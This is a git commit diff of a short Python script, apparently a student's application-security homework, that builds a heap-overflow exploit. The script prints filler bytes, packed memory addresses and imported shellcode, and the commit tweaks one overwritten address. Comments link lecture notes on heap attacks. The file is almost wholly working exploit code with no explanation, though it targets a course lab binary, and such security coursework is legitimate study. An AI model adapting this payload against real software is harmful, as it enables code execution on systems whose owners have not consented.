f8b69540d3375ea110010f43bbed337187323575
ubuntu <ubuntu@ubuntu.(none)>
2018-09-26 21:55:31 -0400

    checkpoint2

--- AppSec/1.2.8.py
+++ AppSec/1.2.8.py
@@ -1,8 +1,19 @@
 from shellcode import shellcode
 from struct import pack
-print '\x01'*40+pack('<I',0x080f3750)+pack('<I',0xbffea7dc)+" "+shellcode+'\x01'*17+pack('<I',0xbffea7dc)+pack('<I',0x080f3748)+" "+'\x01'
+print '\x01'*40+pack('<I',0x080f3750)+pack('<I',0xbffea7dc)+" "+shellcode+'\x01'*17+pack('<I',0xbffea7e8)+pack('<I',0x080f3748)+" "+'\x01'
 
 #recitation
 #http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf
 #https://www.win.tue.nl/~aeb/linux/hh/hh-11.html
 #https://blog.csdn.net/qq_29343201/article/details/59614863
+
+###
+#from shellcode import shellcode
+#from struct import pack
+#print '\x01'*40+pack('<I',0x080f3750)+pack('<I',0xbffea7dc)+" "+shellcode+'\x01'*17+pack('<I',0xbffea7dc)+pack('<I',0x080f3748)+" "+'\x01'
+
+#recitation
+#http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf
+#https://www.win.tue.nl/~aeb/linux/hh/hh-11.html
+#https://blog.csdn.net/qq_29343201/article/details/59614863
+###
